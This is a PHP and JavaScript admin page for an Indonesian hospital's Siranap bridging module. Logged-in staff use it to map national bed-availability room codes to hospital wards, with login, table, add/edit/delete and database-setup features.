<?php
require_once 'config.php';
session_start();
$isLoggedIn = isset($_SESSION['siranap_admin']);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">Siranap - Mapping Kamar</title>
    <link id="favicon" rel="icon" type="image/x-icon" href="">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #1E6F4B;
            --primary-light: #2E9B6E;
            --primary-dark: #145236;
            --accent-teal: #5CB8A6;
            --accent-orange: #F5A623;
            --bg-mint: #E8F5EC;
            --bg-page: #F0F7F2;
            --card-bg: #FFFFFF;
            --text-dark: #1A2E1A;
            --text-muted: #6B7B6B;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-page);
            min-height: 100vh;
            color: var(--text-dark);
            padding-bottom: 30px;
        }

        /* === HEADER === */
        .main-header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
            border-radius: 16px;
            padding: 20px 30px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 20px rgba(30,111,75,0.3);
            margin-bottom: 24px;
        }
        .main-header .brand { display: flex; align-items: center; gap: 15px; }
        .main-header .brand img { height: 50px; filter: brightness(0) invert(1); }
        .main-header .brand h2 { font-weight: 800; font-size: 1.3rem; margin: 0; letter-spacing: 1px; }
        .main-header .brand small { opacity: 0.8; font-size: 0.75rem; }
        .header-clock { text-align: right; }
        .header-clock .date { font-size: 0.9rem; opacity: 0.9; }
        .header-clock .time { font-size: 2rem; font-weight: 800; line-height: 1; }
        .header-clock .live-badge {
            display: inline-block; background: #e74c3c; color: white;
            font-size: 0.6rem; font-weight: 700; padding: 2px 8px;
            border-radius: 10px; margin-left: 8px; animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%,100%{ opacity:1; } 50%{ opacity:0.4; } }

        /* === METRIC CARDS === */
        .metric-card {
            background: var(--card-bg);
            border-radius: 14px;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 16px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            transition: transform 0.2s;
        }
        .metric-card:hover { transform: translateY(-3px); }
        .metric-icon {
            width: 52px; height: 52px; border-radius: 14px;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.4rem; color: white; flex-shrink: 0;
        }
        .metric-icon.total { background: linear-gradient(135deg, #667eea, #764ba2); }
        .metric-icon.occupied { background: linear-gradient(135deg, #f5a623, #e74c3c); }
        .metric-icon.available { background: linear-gradient(135deg, #2ecc71, #1abc9c); }
        .metric-value { font-size: 1.8rem; font-weight: 800; line-height: 1; color: var(--text-dark); }
        .metric-label { font-size: 0.78rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }

        /* === TABLE SECTION === */
        .table-section {
            background: var(--card-bg);
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            margin-top: 24px;
        }
        .table-section-title {
            text-align: center; font-weight: 700; color: var(--primary);
            font-size: 1rem; text-transform: uppercase; letter-spacing: 1px;
            margin-bottom: 16px; padding-bottom: 12px;
            border-bottom: 2px solid var(--bg-mint);
        }

        .table-green {
            width: 100%; border-collapse: separate; border-spacing: 0;
            border-radius: 10px; overflow: hidden;
            border: 1px solid #d4ead8;
        }
        .table-green thead th {
            background: var(--primary); color: white;
            font-weight: 600; font-size: 0.78rem; text-transform: uppercase;
            letter-spacing: 0.5px; padding: 12px 14px; border: none;
        }
        .table-green tbody tr { transition: background 0.15s; }
        .table-green tbody tr:nth-child(even) { background: var(--bg-mint); }
        .table-green tbody tr:nth-child(odd) { background: #f7fcf9; }
        .table-green tbody tr:hover { background: #d4ead8; }
        .table-green tbody td {
            padding: 12px 14px; border: none; vertical-align: middle;
            font-size: 0.88rem; border-bottom: 1px solid #e8f5ec;
        }
        .table-green .badge-id {
            background: var(--primary); color: white;
            padding: 4px 10px; border-radius: 8px; font-size: 0.75rem; font-weight: 600;
        }
        .table-green .badge-covid-yes {
            background: #e74c3c; color: white; padding: 3px 10px;
            border-radius: 8px; font-size: 0.72rem; font-weight: 600;
        }
        .table-green .badge-covid-no {
            background: #2ecc71; color: white; padding: 3px 10px;
            border-radius: 8px; font-size: 0.72rem; font-weight: 600;
        }

        /* === BUTTONS === */
        .btn-green {
            background: linear-gradient(135deg, var(--primary), var(--primary-light));
            color: white; border: none; border-radius: 10px;
            font-weight: 600; padding: 10px 20px;
            box-shadow: 0 3px 12px rgba(30,111,75,0.3);
            transition: all 0.2s;
        }
        .btn-green:hover { transform: translateY(-2px); box-shadow: 0 5px 18px rgba(30,111,75,0.4); color: white; }
        .btn-outline-green {
            background: transparent; color: var(--primary);
            border: 2px solid var(--primary); border-radius: 10px;
            font-weight: 600; padding: 8px 16px; transition: all 0.2s;
        }
        .btn-outline-green:hover { background: var(--primary); color: white; }
        .btn-action {
            border: none; background: transparent; padding: 4px 10px;
            border-radius: 8px; font-size: 0.82rem; font-weight: 500;
            transition: all 0.15s; cursor: pointer;
        }
        .btn-action.edit { color: var(--primary); }
        .btn-action.edit:hover { background: var(--bg-mint); }
        .btn-action.delete { color: #e74c3c; }
        .btn-action.delete:hover { background: #fde8e8; }

        /* === MODALS === */
        .modal-content {
            background: var(--card-bg); border-radius: 16px;
            border: none; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
        }
        .modal-header { border-bottom: 1px solid var(--bg-mint); padding: 20px 24px 12px; }
        .modal-title { font-weight: 700; color: var(--primary); }
        .modal-body { padding: 16px 24px; }
        .modal-footer { border-top: 1px solid var(--bg-mint); padding: 12px 24px 20px; }

        .form-control, .form-select {
            border: 2px solid #e0e8e0; border-radius: 10px;
            padding: 10px 14px; transition: all 0.2s; font-size: 0.9rem;
        }
        .form-control:focus, .form-select:focus {
            border-color: var(--primary-light);
            box-shadow: 0 0 0 3px rgba(30,111,75,0.12);
        }
        .form-label { font-weight: 600; font-size: 0.82rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.3px; }

        /* === LOGIN === */
        .login-wrapper { display: flex; align-items: center; justify-content: center; min-height: 85vh; }
        .login-card {
            max-width: 420px; width: 100%; background: var(--card-bg);
            border-radius: 20px; padding: 40px;
            box-shadow: 0 8px 40px rgba(30,111,75,0.12);
        }
        .login-card .logo-area { text-align: center; margin-bottom: 28px; }
        .login-card .logo-area img { max-height: 60px; margin-bottom: 10px; }
        .login-card .logo-area h4 { font-weight: 800; color: var(--primary); margin-bottom: 4px; }

        /* === FOOTER === */
        .main-footer {
            text-align: center; padding: 20px; margin-top: 30px;
            color: var(--text-muted); font-size: 0.78rem;
        }
        .main-footer strong { color: var(--primary); }
        .main-footer a { color: var(--primary); text-decoration: none; }
        .main-footer a:hover { text-decoration: underline; }

        /* === TOAST === */
        .toast { border-radius: 12px !important; }

        /* inline confirm */
        .inline-confirm { background: #e74c3c !important; color: white !important; font-weight: bold; }
    </style>
</head>
<body>

<?php if (!$isLoggedIn): ?>
<div class="container login-wrapper">
    <div class="login-card">
        <div class="logo-area">
            <img id="hospitalLogoLogin" src="" alt="" style="display:none;">
            <h4 id="hospitalNameLogin"><i class="fas fa-hospital me-2"></i>Siranap</h4>
            <span class="badge" style="background:var(--primary);">ADMIN ACCESS ONLY</span>
        </div>
        <div id="loginError" class="alert alert-danger d-none py-2 px-3 small mb-3"></div>
        <form id="formLogin" onsubmit="handleLogin(event)">
            <div class="mb-3">
                <label class="form-label">Username</label>
                <div class="input-group">
                    <span class="input-group-text" style="background:var(--bg-mint);border:2px solid #e0e8e0;border-right:none;border-radius:10px 0 0 10px;"><i class="fas fa-user" style="color:var(--primary);"></i></span>
                    <input type="text" class="form-control" style="border-left:none;border-radius:0 10px 10px 0;" name="username" placeholder="Masukkan username" required autocomplete="username">
                </div>
            </div>
            <div class="mb-4">
                <label class="form-label">Password</label>
                <div class="input-group">
                    <span class="input-group-text" style="background:var(--bg-mint);border:2px solid #e0e8e0;border-right:none;border-radius:10px 0 0 10px;"><i class="fas fa-lock" style="color:var(--primary);"></i></span>
                    <input type="password" class="form-control" style="border-left:none;border-radius:0 10px 10px 0;" name="password" placeholder="Masukkan password" required autocomplete="current-password">
                </div>
            </div>
            <button type="submit" id="btnLogin" class="btn btn-green w-100 py-2 mb-2">
                <i class="fas fa-sign-in-alt me-1"></i> Masuk
            </button>
            <a href="auto_sync.php" class="btn btn-outline-green w-100 py-2">
                <i class="fas fa-satellite-dish me-1"></i> Buka Terminal Auto-Sync
            </a>
        </form>
    </div>
</div>
<?php else: ?>
<div class="container mt-4">

    <!-- HEADER -->
    <div class="main-header">
        <div class="brand">
            <img id="hospitalLogo" src="" alt="" style="display:none;">
            <div>
                <h2 id="hospitalName"><i class="fas fa-bed me-2"></i>Mapping Kamar Siranap</h2>
                <small id="appName">SIRANAP BRIDGING MODULE</small>
            </div>
        </div>
        <div class="header-clock">
            <div class="date" id="liveDate">--</div>
            <div class="time" id="liveTime">--:--<span class="live-badge">LIVE</span></div>
        </div>
    </div>

    <!-- TOOLBAR -->
    <div class="d-flex justify-content-between align-items-center mb-3">
        <div class="d-flex gap-2">
            <button class="btn btn-outline-green btn-sm" onclick="runDbSetup(this)">
                <i class="fas fa-database me-1"></i> Setup DB
            </button>
            <a href="auto_sync.php" class="btn btn-outline-green btn-sm" target="_blank">
                <i class="fas fa-terminal me-1"></i> Auto-Sync
            </a>
            <button class="btn btn-outline-green btn-sm text-danger" style="border-color:#e74c3c;" onclick="handleLogout()">
                <i class="fas fa-sign-out-alt me-1"></i> Logout
            </button>
        </div>
        <button class="btn btn-green" onclick="openModal('add')">
            <i class="fas fa-plus me-1"></i> Tambah Mapping
        </button>
    </div>

    <!-- METRIC CARDS -->
    <div class="row g-3 mb-0" id="metricsRow">
        <div class="col-md-4">
            <div class="metric-card">
                <div class="metric-icon total"><i class="fas fa-bed"></i></div>
                <div>
                    <div class="metric-value" id="metricTotal">-</div>
                    <div class="metric-label">Total Mapping</div>
                </div>
            </div>
        </div>
        <div class="col-md-4">
            <div class="metric-card">
                <div class="metric-icon occupied"><i class="fas fa-virus"></i></div>
                <div>
                    <div class="metric-value" id="metricCovid">-</div>
                    <div class="metric-label">Mapping Covid</div>
                </div>
            </div>
        </div>
        <div class="col-md-4">
            <div class="metric-card">
                <div class="metric-icon available"><i class="fas fa-check-circle"></i></div>
                <div>
                    <div class="metric-value" id="metricNonCovid">-</div>
                    <div class="metric-label">Mapping Non-Covid</div>
                </div>
            </div>
        </div>
    </div>

    <!-- TABLE -->
    <div class="table-section">
        <div class="table-section-title"><i class="fas fa-table me-2"></i>Mapping Ketersediaan Kamar</div>
        <div class="table-responsive">
            <table class="table-green" id="tableMapping">
                <thead>
                    <tr>
                        <th>ID / Kode Siranap</th>
                        <th>Ruang Siranap</th>
                        <th>Bangsal SIMRS</th>
                        <th>Covid</th>
                        <th class="text-end">Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <tr><td colspan="5" class="text-center" style="padding:30px;">Loading data...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- Toast -->
<div class="position-fixed top-0 end-0 p-3" style="z-index:1060">
    <div id="liveToast" class="toast align-items-center text-white bg-success border-0" role="alert">
        <div class="d-flex">
            <div class="toast-body" id="toastMessage">Data berhasil disimpan!</div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
        </div>
    </div>
</div>

<!-- Modal Form -->
<div class="modal fade" id="modalForm" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="modalFormLabel">Form Mapping</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <form id="formMapping">
            <input type="hidden" id="mode" name="mode">
            <input type="hidden" id="old_id_tt" name="old_id_tt">
            <input type="hidden" id="old_nm_ruang" name="old_nm_ruang">
            <input type="hidden" id="old_kd_bangsal" name="old_kd_bangsal">
            <div class="mb-3">
                <label class="form-label">Kode TT Siranap (Referensi)</label>
                <select class="form-select" id="id_tt" name="id_tt" required>
                    <option value="">Pilih Kode TT</option>
                </select>
            </div>
            <div class="mb-3">
                <label class="form-label">Nama Ruang Siranap (Tipe Kamar)</label>
                <select class="form-select" id="nm_ruang" name="nm_ruang" required>
                    <option value="">Pilih Tipe Ruang</option>
                    <option value="VVIP">VVIP</option>
                    <option value="VIP">VIP</option>
                    <option value="Kelas Utama">Kelas Utama</option>
                    <option value="Kelas I">Kelas I</option>
                    <option value="Kelas II">Kelas II</option>
                    <option value="Kelas III">Kelas III</option>
                    <option value="HCU">HCU</option>
                    <option value="NICU">NICU</option>
                    <option value="Isolasi">Isolasi</option>
                    <option value="Perinatologi">Perinatologi</option>
                    <option value="PICU">PICU</option>
                </select>
            </div>
            <div class="mb-3">
                <label class="form-label">Bangsal SIMRS</label>
                <select class="form-select" id="kd_bangsal" name="kd_bangsal" required>
                    <option value="">Loading bangsal...</option>
                </select>
            </div>
            <div class="mb-3">
                <label class="form-label">Khusus Covid?</label>
                <select class="form-select" id="covid" name="covid" required>
                    <option value="0">Tidak (0)</option>
                    <option value="1">Ya (1)</option>
                </select>
            </div>
        </form>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-outline-green" data-bs-dismiss="modal">Batal</button>
        <button type="button" class="btn btn-green" id="btnSave" onclick="saveData(this)">
            <i class="fas fa-save me-1"></i> Simpan Data
        </button>
      </div>
    </div>
  </div>
</div>

<!-- Modal DB Setup -->
<div class="modal fade" id="modalDbSetup" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><i class="fas fa-database me-2" style="color:var(--accent-orange);"></i>Database Setup & Validation</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <div id="dbSetupProgress" class="text-center py-4">
            <div class="spinner-border mb-3" role="status" style="color:var(--primary);width:3rem;height:3rem;">
              <span class="visually-hidden">Loading...</span>
            </div>
            <p class="text-muted mb-0">Menganalisis skema database...</p>
        </div>
        <div id="dbSetupLogs" class="d-none">
            <div class="p-3 rounded-3" style="background:#1a2e1a;max-height:250px;overflow-y:auto;font-family:monospace;font-size:0.85rem;">
                <div id="dbSetupLogsList"></div>
            </div>
            <div id="dbSetupStatus" class="mt-3"></div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-outline-green" data-bs-dismiss="modal">Tutup</button>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<footer class="main-footer">
    <p class="mb-0">
        Bridging Siranap &copy; 2026. Dikembangkan oleh <strong>RSU Adella Slawi</strong>.
        <a href="https://rsadella.slawi" target="_blank" id="donationLink" style="color:var(--primary);">rsadella.slawi</a> |
        <a href="tel:0823491154" style="color:var(--primary);">0823491154</a> |
        <a href="mailto:rsadella@slawi.com" style="color:var(--primary);">rsadella@slawi.com</a>
    </p>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    const referensi = [
        {id:'1',name:'VVIP/ Super VIP'},{id:'2',name:'VIP'},{id:'3',name:'Kelas I'},
        {id:'4',name:'Kelas II'},{id:'5',name:'Kelas III'},{id:'6',name:'ICU Tanpa Ventilator'},
        {id:'7',name:'HCU'},{id:'8',name:'ICCU/ICVCU Tanpa Ventilator'},{id:'9',name:'RICU Tanpa Ventilator'},
        {id:'10',name:'NICU Tanpa Ventilator'},{id:'11',name:'PICU Tanpa Ventilator'},{id:'12',name:'Isolasi'},
        {id:'14',name:'Perinatologi'},{id:'24',name:'ICU Tekanan Negatif dengan Ventilator'},
        {id:'25',name:'ICU Tekanan Negatif tanpa Ventilator'},{id:'26',name:'ICU Tanpa Tekanan Negatif Dengan Ventilator'},
        {id:'27',name:'ICU Tanpa Tekanan Negatif Tanpa Ventilator'},{id:'28',name:'Isolasi Tekanan Negatif'},
        {id:'29',name:'Isolasi Tanpa Tekanan Negatif'},{id:'30',name:'NICU Khusus Covid'},
        {id:'31',name:'PICU Khusus Covid'},{id:'32',name:'IGD Khusus Covid'},
        {id:'33',name:'VK (TT Observasi di R Bersalin) Khusus Covid'},
        {id:'34',name:'Isolasi Perinatologi Khusus Covid'},
        {id:'36',name:'VK (TT Observasi di R Bersalin) Non Covid'},
        {id:'37',name:'Intermediate Ward (IGD)'},{id:'38',name:'ICU Dengan Ventilator'},
        {id:'39',name:'NICU Dengan Ventilator'},{id:'40',name:'RICU Dengan Ventilator'},
        {id:'41',name:'PICU Dengan Ventilator'},{id:'51',name:'ICCU/ICVCU Dengan Ventilator'}
    ];

    let modalInstance=null, modalDbInstance=null, toastInstance=null;

    // Live clock
    function updateClock(){
        const now=new Date();
        const months=['JAN','FEB','MAR','APR','MEI','JUN','JUL','AGU','SEP','OKT','NOV','DES'];
        const dateEl=document.getElementById('liveDate');
        const timeEl=document.getElementById('liveTime');
        if(dateEl) dateEl.textContent=`${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
        if(timeEl){
            const t=`${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
            timeEl.innerHTML=`${t}<span class="live-badge">LIVE</span>`;
        }
    }
    setInterval(updateClock,1000);
    updateClock();

    document.addEventListener('DOMContentLoaded',()=>{
        const modalFormEl=document.getElementById('modalForm');
        if(modalFormEl) modalInstance=new bootstrap.Modal(modalFormEl);
        const modalDbEl=document.getElementById('modalDbSetup');
        if(modalDbEl) modalDbInstance=new bootstrap.Modal(modalDbEl);
        const toastEl=document.getElementById('liveToast');
        if(toastEl) toastInstance=new bootstrap.Toast(toastEl,{delay:2000});

        fetchBranding();
        const selIdTt=document.getElementById('id_tt');
        if(selIdTt){
            referensi.forEach(item=>{
                const opt=document.createElement('option');
                opt.value=item.id;
                opt.textContent=`${item.id} - ${item.name}`;
                selIdTt.appendChild(opt);
            });
            loadBangsal();
            loadMapping();
        }
    });

    function handleLogin(e){
        e.preventDefault();
        const form=document.getElementById('formLogin');
        const btn=document.getElementById('btnLogin');
        const errorDiv=document.getElementById('loginError');
        if(!form.username.value||!form.password.value){errorDiv.textContent='Lengkapi username dan password!';errorDiv.classList.remove('d-none');return;}
        const originalText=btn.innerHTML;
        btn.innerHTML='<i class="fas fa-spinner fa-spin me-1"></i> Menyambungkan...';
        btn.disabled=true;errorDiv.classList.add('d-none');
        const params=new URLSearchParams();
        params.append('username',form.username.value);
        params.append('password',form.password.value);
        fetch('api_mapping.php?action=login',{method:'POST',body:params,headers:{'Content-Type':'application/x-www-form-urlencoded'}})
        .then(r=>r.json()).then(r=>{
            if(r.status==='success'){btn.innerHTML='<i class="fas fa-check me-1"></i> Berhasil!';btn.style.background='#2ecc71';setTimeout(()=>location.reload(),1000);}
            else{btn.innerHTML=originalText;btn.disabled=false;errorDiv.textContent=r.message;errorDiv.classList.remove('d-none');}
        }).catch(()=>{btn.innerHTML=originalText;btn.disabled=false;errorDiv.textContent='Terjadi kesalahan koneksi';errorDiv.classList.remove('d-none');});
    }

    function handleLogout(){
        fetch('api_mapping.php?action=logout').then(r=>r.json()).then(r=>{if(r.status==='success')location.reload();}).catch(e=>console.error(e));
    }

    function showToast(msg,isError=false){
        document.getElementById('toastMessage').textContent=msg;
        const el=document.getElementById('liveToast');
        if(el&&toastInstance){el.classList.remove('bg-success','bg-danger');el.classList.add(isError?'bg-danger':'bg-success');toastInstance.show();}
    }

    function fetchBranding(){
        fetch('api_mapping.php?action=get_setting').then(r=>r.json()).then(r=>{
            if(r.status==='success'){
                const d=r.data;
                const h=document.getElementById('hospitalName');
                if(h) h.innerHTML=`<i class="fas fa-bed me-2"></i>Mapping Kamar ${d.nama_instansi}`;
                const hL=document.getElementById('hospitalNameLogin');
                if(hL) hL.innerHTML=`<i class="fas fa-hospital me-2"></i>${d.nama_instansi}`;
                document.getElementById('pageTitle').textContent=`Siranap - ${d.nama_instansi}`;
                if(d.logo){
                    ['hospitalLogo','hospitalLogoLogin'].forEach(id=>{const img=document.getElementById(id);if(img){img.src=d.logo;img.style.display='block';}});
                    document.getElementById('favicon').href=d.logo;
                }
            }
        }).catch(e=>console.error(e));
    }

    function loadBangsal(){
        fetch('api_mapping.php?action=list_bangsal').then(r=>r.json()).then(r=>{
            if(r.status==='success'){
                const sel=document.getElementById('kd_bangsal');
                sel.innerHTML='<option value="">Pilih Bangsal</option>';
                r.data.forEach(b=>{const o=document.createElement('option');o.value=b.kd_bangsal;o.textContent=`${b.kd_bangsal} - ${b.nm_bangsal}`;sel.appendChild(o);});
            }
        }).catch(e=>console.error(e));
    }

    function getRefName(id){const f=referensi.find(x=>x.id==id);return f?f.name:id;}

    function updateMetrics(data){
        const total=document.getElementById('metricTotal');
        const covid=document.getElementById('metricCovid');
        const nonCovid=document.getElementById('metricNonCovid');
        if(total) total.textContent=data.length;
        if(covid) covid.textContent=data.filter(r=>r.covid=='1').length;
        if(nonCovid) nonCovid.textContent=data.filter(r=>r.covid!='1').length;
    }

    function loadMapping(){
        const tbody=document.querySelector('#tableMapping tbody');
        tbody.innerHTML='<tr><td colspan="5" class="text-center" style="padding:30px;">Loading data...</td></tr>';
        fetch('api_mapping.php?action=list_mapping').then(r=>r.json()).then(r=>{
            tbody.innerHTML='';
            if(r.status==='success'){
                updateMetrics(r.data);
                if(r.data.length===0){tbody.innerHTML='<tr><td colspan="5" class="text-center" style="padding:30px;color:var(--text-muted);">Belum ada data mapping.</td></tr>';return;}
                r.data.forEach((row,i)=>{
                    const tr=document.createElement('tr');
                    const refName=getRefName(row.id_tt_sirsonline);
                    tr.innerHTML=`
                        <td><span class="badge-id">${row.id_tt_sirsonline}</span> <small style="color:var(--text-muted);display:block;margin-top:4px;">${refName}</small></td>
                        <td style="font-weight:600;">${row.nm_ruang_sirsonline}</td>
                        <td>${row.nm_bangsal}<br><small style="color:var(--text-muted);">(${row.kd_bangsal})</small></td>
                        <td>${row.covid=='1'?'<span class="badge-covid-yes">Ya</span>':'<span class="badge-covid-no">Tidak</span>'}</td>
                        <td class="text-end">
                            <button class="btn-action edit" onclick='openModal("edit",${JSON.stringify(row)})'><i class="fas fa-edit me-1"></i>Edit</button>
                            <button class="btn-action delete" id="btn-del-${i}" onclick="confirmDelete(this,'${row.id_tt_sirsonline}','${row.nm_ruang_sirsonline}','${row.kd_bangsal}')"><i class="fas fa-trash me-1"></i>Hapus</button>
                        </td>`;
                    tbody.appendChild(tr);
                });
            }else{tbody.innerHTML=`<tr><td colspan="5" class="text-center" style="color:#e74c3c;padding:30px;">Error: ${r.message}</td></tr>`;}
        }).catch(()=>{tbody.innerHTML='<tr><td colspan="5" class="text-center" style="color:#e74c3c;padding:30px;">Network Error</td></tr>';});
    }

    function openModal(mode,data=null){
        document.getElementById('formMapping').reset();
        document.getElementById('mode').value=mode;
        if(mode==='edit'&&data){
            document.getElementById('modalFormLabel').textContent='Edit Mapping';
            document.getElementById('old_id_tt').value=data.id_tt_sirsonline;
            document.getElementById('old_nm_ruang').value=data.nm_ruang_sirsonline;
            document.getElementById('old_kd_bangsal').value=data.kd_bangsal;
            document.getElementById('id_tt').value=data.id_tt_sirsonline;
            document.getElementById('nm_ruang').value=data.nm_ruang_sirsonline;
            document.getElementById('kd_bangsal').value=data.kd_bangsal;
            document.getElementById('covid').value=data.covid;
        }else{
            document.getElementById('modalFormLabel').textContent='Tambah Mapping Baru';
            document.getElementById('old_id_tt').value='';
            document.getElementById('old_nm_ruang').value='';
            document.getElementById('old_kd_bangsal').value='';
            document.getElementById('nm_ruang').value='Kelas I';
        }
        modalInstance.show();
    }

    function saveData(btn){
        const form=document.getElementById('formMapping');
        if(!form.id_tt.value||!form.nm_ruang.value||!form.kd_bangsal.value){showToast('Semua field wajib diisi!',true);return;}
        const formData=new URLSearchParams();
        for(const pair of new FormData(form)) formData.append(pair[0],pair[1]);
        const originalText=btn.innerHTML;
        btn.innerHTML='<i class="fas fa-spinner fa-spin me-1"></i> Menyimpan...';btn.disabled=true;
        fetch('api_mapping.php?action=save',{method:'POST',body:formData,headers:{'Content-Type':'application/x-www-form-urlencoded'}})
        .then(r=>r.json()).then(r=>{
            if(r.status==='success'){
                btn.innerHTML='<i class="fas fa-check me-1"></i> Tersimpan!';btn.style.background='#2ecc71';
                setTimeout(()=>{modalInstance.hide();btn.style.background='';btn.innerHTML=originalText;btn.disabled=false;loadMapping();showToast(r.message);},1500);
            }else{btn.innerHTML=originalText;btn.disabled=false;showToast(r.message,true);}
        }).catch(()=>{btn.innerHTML=originalText;btn.disabled=false;showToast('Terjadi kesalahan jaringan',true);});
    }

    let deleteConfirmTimer=null;
    function confirmDelete(btn,id_tt,nm_ruang,kd_bangsal){
        if(!btn.classList.contains('inline-confirm')){
            const orig=btn.innerHTML;btn.dataset.originalHtml=orig;
            btn.classList.add('inline-confirm');btn.innerHTML='<i class="fas fa-exclamation-triangle"></i> Yakin?';
            deleteConfirmTimer=setTimeout(()=>{btn.classList.remove('inline-confirm');btn.innerHTML=btn.dataset.originalHtml;},3000);
            return;
        }
        clearTimeout(deleteConfirmTimer);btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>';
        const fd=new URLSearchParams();
        fd.append('id_tt',id_tt);fd.append('nm_ruang',nm_ruang);fd.append('kd_bangsal',kd_bangsal);
        fetch('api_mapping.php?action=delete',{method:'POST',body:fd,headers:{'Content-Type':'application/x-www-form-urlencoded'}})
        .then(r=>r.json()).then(r=>{
            if(r.status==='success'){showToast(r.message);loadMapping();}
            else{showToast(r.message,true);btn.classList.remove('inline-confirm');btn.innerHTML=btn.dataset.originalHtml;}
        }).catch(()=>{showToast('Terjadi kesalahan jaringan',true);btn.classList.remove('inline-confirm');btn.innerHTML=btn.dataset.originalHtml;});
    }

    function runDbSetup(btn){
        const origText=btn.innerHTML;btn.innerHTML='<i class="fas fa-spinner fa-spin me-1"></i> Running...';btn.disabled=true;
        document.getElementById('dbSetupProgress').classList.remove('d-none');
        document.getElementById('dbSetupLogs').classList.add('d-none');
        document.getElementById('dbSetupLogsList').innerHTML='';
        document.getElementById('dbSetupStatus').innerHTML='';
        modalDbInstance.show();
        fetch('api_mapping.php?action=setup_db').then(r=>r.json()).then(async r=>{
            document.getElementById('dbSetupProgress').classList.add('d-none');
            document.getElementById('dbSetupLogs').classList.remove('d-none');
            const list=document.getElementById('dbSetupLogsList');
            const statusDiv=document.getElementById('dbSetupStatus');
            if(r.status==='success'){
                const logs=r.details||[];
                appendSetupLog('Menganalisis skema database...','info');
                await new Promise(r=>setTimeout(r,400));
                if(logs.length===0){
                    appendSetupLog('Semua tabel dan kolom wajib sudah sesuai.','success');
                    await new Promise(r=>setTimeout(r,400));
                    statusDiv.innerHTML='<div class="alert alert-success border-0 mb-0"><i class="fas fa-check-circle me-1"></i> Database fully up-to-date.</div>';
                }else{
                    for(const log of logs){
                        let icon='<i class="fas fa-plus-circle" style="color:#2ecc71;margin-right:8px;"></i>';
                        if(log.type==='alter_add') icon='<i class="fas fa-wrench" style="color:#f5a623;margin-right:8px;"></i>';
                        else if(log.type==='alter_modify') icon='<i class="fas fa-sync-alt" style="color:#5CB8A6;margin-right:8px;"></i>';
                        else if(log.type==='insert_default') icon='<i class="fas fa-database" style="color:#5CB8A6;margin-right:8px;"></i>';
                        appendSetupLog(log.text,log.status,icon);
                        await new Promise(r=>setTimeout(r,500));
                    }
                    statusDiv.innerHTML=`<div class="alert alert-success border-0 mb-0"><i class="fas fa-check-circle me-1"></i> ${r.message}</div>`;
                }
                fetchBranding();loadBangsal();loadMapping();showToast('Database berhasil divalidasi!');
            }else{
                appendSetupLog('Error: '+r.message,'danger');
                statusDiv.innerHTML=`<div class="alert alert-danger border-0 mb-0"><i class="fas fa-exclamation-triangle me-1"></i> Setup Gagal: ${r.message}</div>`;
                showToast('Setup DB Gagal!',true);
            }
        }).catch(()=>{
            document.getElementById('dbSetupProgress').classList.add('d-none');
            document.getElementById('dbSetupLogs').classList.remove('d-none');
            document.getElementById('dbSetupLogsList').innerHTML='<div style="color:#e74c3c;"><i class="fas fa-exclamation-circle me-2"></i>Gagal terhubung ke server.</div>';
            document.getElementById('dbSetupStatus').innerHTML='<div class="alert alert-danger border-0 mb-0"><i class="fas fa-exclamation-triangle me-1"></i>Gangguan Koneksi Jaringan.</div>';
            showToast('Setup DB Gagal!',true);
        }).finally(()=>{btn.innerHTML=origText;btn.disabled=false;});
    }

    function appendSetupLog(text,type,icon=''){
        const list=document.getElementById('dbSetupLogsList');
        const item=document.createElement('div');item.className='mb-2 d-flex align-items-center';
        let color='#ccc';
        if(type==='success') color='#2ecc71';
        if(type==='danger') color='#e74c3c';
        if(type==='warning') color='#f5a623';
        if(type==='info') color='#5CB8A6';
        if(!icon){
            icon='<i class="fas fa-info-circle" style="color:#5CB8A6;margin-right:8px;"></i>';
            if(type==='success') icon='<i class="fas fa-check-circle" style="color:#2ecc71;margin-right:8px;"></i>';
            if(type==='danger') icon='<i class="fas fa-times-circle" style="color:#e74c3c;margin-right:8px;"></i>';
            if(type==='warning') icon='<i class="fas fa-exclamation-circle" style="color:#f5a623;margin-right:8px;"></i>';
        }
        item.innerHTML=`${icon}<span style="color:${color}">${text}</span>`;
        list.appendChild(item);list.scrollTop=list.scrollHeight;
    }
</script>
